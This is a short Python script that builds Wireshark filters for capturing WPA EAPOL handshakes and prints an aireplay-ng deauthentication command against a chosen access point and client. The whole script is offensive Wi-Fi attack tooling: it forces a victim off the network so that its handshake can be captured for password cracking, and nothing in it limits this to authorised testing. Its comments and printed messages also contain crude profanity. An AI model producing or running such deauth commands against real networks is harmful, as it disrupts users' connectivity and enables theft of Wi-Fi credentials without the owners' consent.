
apMAC = input('Enter the Access Point MAC: ')
clientMAC = input('Enter the target Client MAC: ')
print("\n")

#Initialize output strings and add the target MACs

eapolString = "(wlan.addr==" + apMAC + " && eapol)" 
fullwiresharkString = "(wlan.addr==" + apMAC + " && eapol) or (wlan.addr==" + apMAC + " && wlan.fc.subtype==8) or (wlan.addr==" + apMAC + " && wlan.fc.subtype==5)"
commandLine = "sudo aireplay-ng -0 1 -a " + apMAC + " -c " + clientMAC + " kismon0"

#Print that shit

print("You Lazy Bitch \n")

print("Wireshark search strings: \n")
print("EAPOL Only")
print(eapolString + "\n")

print("EAPOL, Probes, Beacons")
print(fullwiresharkString + "\n")

print("Deauth shell command: \n")
print(commandLine + "\n")

